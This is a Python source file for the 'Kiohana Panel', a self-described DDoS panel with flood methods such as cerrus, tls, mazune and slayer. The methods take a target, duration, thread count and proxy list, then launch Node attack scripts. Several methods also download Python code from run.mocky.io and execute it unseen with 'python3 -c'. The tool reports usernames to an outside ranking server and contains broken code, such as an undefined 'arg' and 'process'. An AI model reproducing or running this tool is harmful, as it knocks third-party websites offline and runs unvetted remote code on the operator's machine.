import os
import pathlib
import sys
import shutil
import threading
import subprocess
import shlex
import json
import stat
import requests
import signal
import subprocess
import time
import sys
import traceback
import time
import datetime
current_time = datetime.datetime.now()
formatted_time = current_time.strftime("%Y-%m-%d %H:%M:%S")
#Dont Rape Api PLS, It is ranking 
def get_total_access():
    url = "https://rankuserhnu.000webhostapp.com/user_data.json"
    response = requests.get(url)
    
    total_access = 0
    if response.status_code == 200:
        user_data = response.json()
        for count in user_data.values():
            total_access += count
    return total_access
def anhnguyenz():
    url = "https://rankuserhnu.000webhostapp.com/user_data.json"
    response = requests.get(url)
    
    if response.status_code == 200:
        user_data = response.json()
        sorted_users = sorted(user_data.items(), key=lambda x: x[1], reverse=True)
def anhnguyenx():
    url = "https://rankuserhnu.000webhostapp.com/user_data.json"
    response = requests.get(url)
    
    if response.status_code == 200:
        user_data = response.json()
        sorted_users = sorted(user_data.items(), key=lambda x: x[1], reverse=True)
        
        print("Ranking:")
        for name, count in sorted_users:
            print(f"{name}: {count} ")
def ngocuyenngunhucho():
    try:
        with open("user_name.txt", "r") as file:
            user_name = file.readline().strip()
    except FileNotFoundError:
        user_name = input("Your Username: ")
        with open("user_name.txt", "w") as file:
            file.write(user_name)
    return user_name
def saobanlaidecodecaipanellorcuatui(user_name):
    url = "https://rankuserhnu.000webhostapp.com/api.php"
    data = {"user_name": user_name}
    response = requests.post(url, data=data)
def clear(kiohana):
    print ("Clear 😁, Bye")
    sys.exit()
class Color:
    def blue(): return '\033[94m'
    def green(): return '\033[92m'
    def yellow(): return '\033[93m'
    def red(): return '\033[91m'
    def reset(): return '\033[0m'
    def bg_green(i=""): return '\x1b[6;30;42m' + str(i) + '\x1b[0m'

class bin:
    def is_dir(dir): return pathlib.Path(dir).is_dir()
    def is_file(file): return pathlib.Path(file).is_file()
    def touch(file): return pathlib.Path(file).touch()
    def err(e): print("{}: missing operand".format(e))
    def title(): os.system("title Shell") if os.name == 'nt' else os.system("")
    def owner_group(file):
        if os.name == 'nt':
            return ""
        return "{}\t{}".format(pathlib.Path(file).owner(),pathlib.Path(file).group())
    def shell_split(cmd=""):
        if os.name == 'posix': return shlex.split(cmd)
        else:
            if not cmd: return []
            return json.loads(subprocess.check_output('{} {}'.format(subprocess.list2cmdline([sys.executable, '-c', 'import sys, json; print(json.dumps(sys.argv[1:]))']), cmd)).decode())
    def chmod(file,chmod_per=9999,is_chmod=1):
        if bin.is_file(file) and bin.is_dir(file):
            print("chmod: cannot access '{}': No such file or directory".format(file))
        elif is_chmod == 0:
            return eval("stat.filemode({})".format(oct(os.stat(file).st_mode)))
        elif chmod_per == 9999:
            print("chmod: missing operand after '{}'".format(file))
        elif len(chmod_per)>3 or len([str(char) for char in str(chmod_per) if int(char)<=7]) != 3:
            print("chmod: invalid mode: '{}'".format(chmod_per))
            return
        os.chmod(str(file),int(chmod_per))
    def main():
        bin.title()
        print("\nWellcome To Kiohana Panel")
        print(f'''
\033[92m__Building__Author__  : \033[93m@Huynhngocuyen
\033[92m__Collaborative__Author : \033[93m@Definclasshanh
\033[92m__Shell__Author : \033[93m @KhanhNguyen9872
\033[92m__Total__User__Access__ : \033[93m{get_total_access()}
           ''')
        while 1:
            try:
                bin.shell()
            except KeyboardInterrupt:
                print("^C")
    def shell():
        try:
            user = os.getlogin() if os.name == 'nt' else os.environ['USER']
        except KeyError:
            user = subprocess.getoutput('whoami')
        print("\n\033[94m┌──"+ "\033[92m"+ user + "@\033[94mKiohana-Panel)\033[92m-\033[92m["+"\033[78m" +formatted_time+"{1}]".format(Color.reset(),Color.green(),Color.blue(),user,"~" if os.getcwd()==os.path.expanduser('~') else os.getcwd()))
        print("└─{1}${0}".format(Color.reset(),Color.blue()),end = ' ')
        cmd=bin.shell_split(str(input()))
        try:
            if cmd[0]=="dir":
                int("Khanh")
            globals()[cmd[0]](cmd[1:])
        except (ValueError, KeyError, TypeError):
            try:
                os.system("{0} {1}".format(cmd[0],' '.join(cmd[1:])))
            except FileNotFoundError:
                print("-shell: {0}: command not found".format(cmd[0]))
        except IndexError:
            return
   
def help(kiohana):
    print(f'''
start/layer7/l7: Start Ddos Panel
tools: Tools other than ddos
clear: Clear the console
author: Infomation Author
exit: Exit Panel
            ''')
def handler(sig, frame):
    file_path = "ㅤ"
    os.remove(file_path)
    print("\nBye Bye 😒")
    sys.exit(0)
def set_terminal_title(title):
    sys.stdout.write(f"\x1b]2;{title}\x07")

    
def start(kiohana):
	print('''
               \x1b[38;2;59;241;250m フ\033[94mイ\x1b[38;2;224;0;142mン\x1b[38;2;224;0;042m・\x1b[38;2;124;0;342mゴック・ウエンMethods.                                    
            \033[94m—   \x1b[38;2;0;255;189mᴄᴇʀʀᴜs \033[94m   — \033[92m  sᴀᴋᴜʀᴀ     \033[94m—   \033[93mᴘʜᴏᴇɴɪx    
            \033[94m—   \x1b[38;2;0;255;189mʜᴛᴛᴘᴛᴡᴏ \033[94m  — \033[92m  sʟᴀʏᴇʀ   \033[94m  —   \033[93mᴀsᴀᴍɪ 
            \033[94m—   \x1b[38;2;0;255;189msᴏᴄᴋᴇᴛ \033[94m   — \033[92m  ʜᴛᴛᴘᴛx    \033[94m —   \033[93mʀʏᴏsʜɪɴ     
            \033[94m—   \x1b[38;2;0;255;189mᴛʟs  \033[94m     — \033[92m  ᴄᴇʀʀᴜsx   \033[94m —   \033[93mʜᴏʀɴʏ     
            \033[94m—   \x1b[38;2;0;255;189mᴛʟsx  \033[94m    — \033[92m  ʀᴀᴡ        \033[94m—   \033[93mᴍᴀᴢᴜɴᴇ       
   ''')
def layer7(kiohana):
	print('''
                \x1b[38;2;59;241;250m フ\033[94mイ\x1b[38;2;224;0;142mン\x1b[38;2;224;0;042m・\x1b[38;2;124;0;342mゴック・ウエンMethods.                                    
            \033[94m—   \x1b[38;2;0;255;189mᴄᴇʀʀᴜs \033[94m   — \033[92m  sᴀᴋᴜʀᴀ     \033[94m—   \033[93mᴘʜᴏᴇɴɪx    
            \033[94m—   \x1b[38;2;0;255;189mʜᴛᴛᴘᴛᴡᴏ \033[94m  — \033[92m  sʟᴀʏᴇʀ   \033[94m  —   \033[93mᴀsᴀᴍɪ 
            \033[94m—   \x1b[38;2;0;255;189msᴏᴄᴋᴇᴛ \033[94m   — \033[92m  ʜᴛᴛᴘᴛx    \033[94m —   \033[93mʀʏᴏsʜɪɴ     
            \033[94m—   \x1b[38;2;0;255;189mᴛʟs  \033[94m     — \033[92m  ᴄᴇʀʀᴜsx   \033[94m —   \033[93mʜᴏʀɴʏ     
            \033[94m—   \x1b[38;2;0;255;189mᴛʟsx  \033[94m    — \033[92m  ʀᴀᴡ        \033[94m—   \033[93mᴍᴀᴢᴜɴᴇ       
   ''')
def l7(kiohana):
	print('''
                \x1b[38;2;59;241;250m フ\033[94mイ\x1b[38;2;224;0;142mン\x1b[38;2;224;0;042m・\x1b[38;2;124;0;342mゴック・ウエンMethods.                                    
            \033[94m—   \x1b[38;2;0;255;189mᴄᴇʀʀᴜs \033[94m   — \033[92m  sᴀᴋᴜʀᴀ     \033[94m—   \033[93mᴘʜᴏᴇɴɪx    
            \033[94m—   \x1b[38;2;0;255;189mʜᴛᴛᴘᴛᴡᴏ \033[94m  — \033[92m  sʟᴀʏᴇʀ   \033[94m  —   \033[93mᴀsᴀᴍɪ 
            \033[94m—   \x1b[38;2;0;255;189msᴏᴄᴋᴇᴛ \033[94m   — \033[92m  ʜᴛᴛᴘᴛx    \033[94m —   \033[93mʀʏᴏsʜɪɴ     
            \033[94m—   \x1b[38;2;0;255;189mᴛʟs  \033[94m     — \033[92m  ᴄᴇʀʀᴜsx   \033[94m —   \033[93mʜᴏʀɴʏ     
            \033[94m—   \x1b[38;2;0;255;189mᴛʟsx  \033[94m    — \033[92m  ʀᴀᴡ        \033[94m—   \033[93mᴍᴀᴢᴜɴᴇ       
   ''')
   #
def cerrus(kiohana):
    noi_dung = "https://run.mocky.io/v3/c9cba395-5871-49f7-be9d-605ff30294d4"
    target = input("""Target : """)
    time = input("""Time : """)
    thread = input("""Threads : """)
    attack_type = input("""Mode(Attack/Bypass)""")
    proxy_file = input("""Proxy : """)
    try:
        ngocuyen = requests.get(noi_dung)
        if ngocuyen.status_code == 200:
            hnu = ngocuyen.text
            input_data = hnu.encode('utf-8')
            file_path = ".ㅤ"

            with open(file_path, 'wb') as file:
                # Ghi nội dung vào file dưới dạng bytes
                file.write(input_data)

            signal.signal(signal.SIGINT, handler)
            signal.signal(signal.SIGTSTP, handler)

            # Sử dụng subprocess.Popen để chạy chương trình con
            command = ["python3", "-c", hnu, target, time, thread, attack_type, proxy_file]
            subprocess.run(command)
            process.communicate()  # Chờ cho quá trình con kết thúc
            os.remove(file_path)
        else:
            print("Can Using The Method Pls Enable The Internet")
    except Exception as e:
        print("Đã xảy ra lỗi: ", str(e))
def httptwo(kiohana):
    target_input = input("""Target : """)
    time_input = input("""Time : """)
    threads_input = input("""Threads : """)
    rps = input("""Rps : """)
    proxy_file_input = input("""Proxy : """)
    noi_dung = "https://run.mocky.io/v3/a6632ab2-df05-4b8f-ae36-b2f094335ef2"
    try:
        ngocuyen = requests.get(noi_dung)
        if ngocuyen.status_code == 200:
            hnu = ngocuyen.text
            signal.signal(signal.SIGINT, handler)
            signal.signal(signal.SIGTSTP, handler)
            command = ["python3", "-c", hnu, target_input, time_input, threads_input, proxy_file_input, rps]
            subprocess.run(command)
    except Exception as e:
        print("Đã xảy ra lỗi: ", str(e))
def httptx(kiohana):
	#console.log('node ' + file + ' <url> <time> <req> <threads> <proxy> (Made By HuynhNgocUyen'); 
    script_folder = "http2.js"  # python3", "-c", hnu, target_input, time_input, threads_input, proxy_file_input, rps
    target = input("Target : ")
    time = input("Time : ")
    req = input("Req : ")
    threads = input ("Threads : ")
    proxy = input("Proxy : ")
    rps = input("Rps : ")
    #command = ["python3", "-c", hnu, target_input, time_input, threads_input, proxy_file_input, rps]
    command = ["node", script_folder,target,time,req,threads,proxy,rps]
    subprocess.run(command)
def socket(kiohana):
    
    noi_dung = "https://run.mocky.io/v3/f82cbb8b-9d86-4395-9bd2-769762769626"
    try:
        ngocuyen = requests.get(noi_dung)
        if ngocuyen.status_code == 200:
            hnu = ngocuyen.text
            signal.signal(signal.SIGINT, handler)
            signal.signal(signal.SIGTSTP, handler)
            command = ["python3", "-c", hnu]
            subprocess.run(command)
    except Exception as e:
        print("Đã xảy ra lỗi: ", str(e))
        
def tls(kiohana):
    noi_dung = "https://run.mocky.io/v3/3511b2e6-c273-4f1e-9fca-0cd3934b3b8a"
    try:
        ngocuyen = requests.get(noi_dung)
        if ngocuyen.status_code == 200:
            hnu = ngocuyen.text
            signal.signal(signal.SIGINT, handler)
            signal.signal(signal.SIGTSTP, handler)
            command = ["python3", "-c", hnu]
            subprocess.run(command)
    except Exception as e:
        print("Đã xảy ra lỗi: ", str(e))

def tls2(kiohana):
    target_input = input("""Target : """)
    rate_input = input("""Rate : """)
    time_input = input("""Time : """)
    threads_input = input("Threads : ")
    proxy_file_input = input("""Proxy : """)
    noi_dung = "https://run.mocky.io/v3/9913009f-f355-4c79-a169-e2a3c02cae76"
    try:
        ngocuyen = requests.get(noi_dung)
        if ngocuyen.status_code == 200:
            hnu = ngocuyen.text
            signal.signal(signal.SIGINT, handler)
            signal.signal(signal.SIGTSTP, handler)
            command = ["python3", "-c", hnu, target_input,rate_input, time_input, threads_input, proxy_file_input]
            subprocess.run(command)
    except Exception as e:
        print("Đã xảy ra lỗi: ", str(e))     
def raw(kiohana):
    script_folder = "raw1.js" 
    target = input("Target : ")
    time = input("Time : ")
    #console.log('node ' + file + ' <method> <host> <proxy> <sleep> <rate> <threads> (options cookie="" postdata="" randomstring="" headerdata="" useragent="" referer="")');
    command = ["node", script_folder, target, time]
    print ("Sakura Dev By HuynhNgocUyen(F-UA ATTACK)")
    subprocess.run(command)
def sakura(kiohana):
    script_folder = "sakura.js" 
    target = input("Target : ")
    #console.log('node ' + file + ' <method> <host> <proxy> <sleep> <rate> <threads> (options cookie="" postdata="" randomstring="" headerdata="" useragent="" referer="")');
    command = ["node", script_folder, target,'1000']
    subprocess.run(command)
def cerrustx(kiohana):
    script_folder = "CerrusV2.js" 
    #node CerrusV2.js <URL> <TIME> <TREADS> proxy
    target = input("Target : ")
    time = input("Time : ")
    threads = input("Threads :")
    proxy = "proxy"
    #console.log('node ' + file + ' <method> <host> <proxy> <sleep> <rate> <threads> (options cookie="" postdata="" randomstring="" headerdata="" useragent="" referer="")');
    command = ["node", script_folder, target, time,threads,proxy]
    subprocess.run(command)
def mazune(kiohana):
    script_folder = "mazune.js"  # Tên thư mục chứa file attack_script.py
    methods = "POST"
    target = input("Target : ")
    time = input("Time : ")
    proxy = input("Proxy : ")
    sleep = input ("Sleep :")
    rate = input ("Rate :")
    threads = input ("Threads : ")
    command = ["node", script_folder, methods, target,proxy,sleep,rate,threads]
    print ("Mazune Dev By HuynhNgocUyen(TLS1.3 ATTACK)")
    subprocess.run(command)
def godzilla(kiohana):
	#console.log('node ' + file + ' <url> <time> <req> <threads> <proxy> (Made By HuynhNgocUyen'); 
    script_folder = "god.js"  # Tên thư mục chứa file attack_script.py
    target = input("Target : ")
    time = input("Time : ")
    req = input("Req : ")
    threads = input ("Threads : ")
    proxy = input("Proxy : ")
    command = ["node", script_folder,target,time,req,threads,proxy]
    print ("Godzilla! Sent!")
    subprocess.run(command)
def ryoshin(kiohana):
	#console.log("Usage: node ryoshin.js target time rate thread proxyfile");
    script_path = "ryoshin"  # Tên thư mục chứa file attack_script.py
    target = input("Target : ")
    time = input("Time : ")
    rate = input("Rate : ")
    threads = input ("Threads : ")
    proxy = input("Proxy : ")
    command = ["node", script_path,target,time,rate,threads,proxy]
    print ("Ryoshin Attack!!")
    subprocess.run(command)
def horny(kiohana):
	#Usage: node horny [Host] [Duration] [RQ/S] [Thread]
    script_folder = "horny"  # Tên thư mục chứa file attack_script.py
    target = input("Host : ")
    time = input("Duration : ")
    rate = input("Rq/s : ")
    threads = input ("Threads : ")
    command = ["node", script_folder,target,time,rate,threads]
    print ("Horny Attack ")
    subprocess.run(command)
def asami(kiohana):
    script_path = "asami.js"  
    #node asami.js target time rate thread proxyfile
    #
    target = input("Target: ")
    time = input("Time: ")
    rate = input("Rate: ")
    threads = input("Threads: ")
    proxy = input("Proxy: ")
    command = ["node", script_path, target,time, rate, threads,proxy]
    print("Asami Attack (Flood)")
    subprocess.run(command)
def phoenix(kiohana):
	#node Super-Flood.js target time 64 32 http.txt
    script_path = "phoenix.js"  # Tên thư mục chứa file attack_script.py
    target = input("Target : ")
    time = input("Time : ")
    threads = input("Threads : ")
    rate = input("Rate :")
    proxy = input("Proxy : ")
    command = ["node", script_path,target,rate,threads,proxy]
    print ("Phoenix Attack!!!")
    subprocess.run(command)
def slayer(kiohana):
	#node slayer GET [Target] [Proxy List] [Time] [rate] [Threads]
    script_path = "slayer"  # Tên thư mục chứa file attack_script.py
    methods = "GET"
    target = input("Target : ")
    proxy = input("Proxy : ")
    time = input("Time : ")
    rate = input("Rate : ")
    threads = input("Threads :")
    command = ["node", script_path,methods,target,proxy,time,rate,threads]
    print ("Slayer Powerfull Attack!!!")
    subprocess.run(command)
def rank(kiohana):
    user_name = ngocuyenngunhucho(kiohana)
    saobanlaidecodecaipanellorcuatui(user_name)
    anhnguyenx()
def author(kiohana):
	print ("Shell Credit : KhanhNguyen")
	print ("Building The Methods : NgocUyen")
	print ("Fixed,Tester : HaiAnhNguyen")
	print ("""
Infomation KhanhNguyen :
https://github.com/KhanhNguyen9872/
https://www.facebook.com/khanh10a1
t.me/khanhnguyen9872
Infomation NgocUyen :
https://www.facebook.com/datishnu1907
t.me/@huynhngocuyenn
https://github.com/hngocuyen
Infomation HaiAnhNguyen :
https://www.facebook.com/profile.php?id=100087564811660""")
def exit(kiohana):
    if arg==[]:
        arg=["0"]
    try:
        sys.exit(int(arg[0]))
    except ValueError:
        print("\rshell: exit: {}: numeric argument required".format(arg[0]))
        
def anhnguyenuwu():
    user_name = ngocuyenngunhucho()
    saobanlaidecodecaipanellorcuatui(user_name)
def rank(kiohana):
    user_name = ngocuyenngunhucho()
    saobanlaidecodecaipanellorcuatui(user_name)
    anhnguyenx()        
        

if __name__ == '__main__':
    os.system('clear')
    anhnguyenuwu()
    set_terminal_title(f"Kiohana-Panel, All User_Access : {get_total_access()}")
    HOME = os.path.expanduser('~') # Gán giá trị cho biến uyen
    


    bin.main()
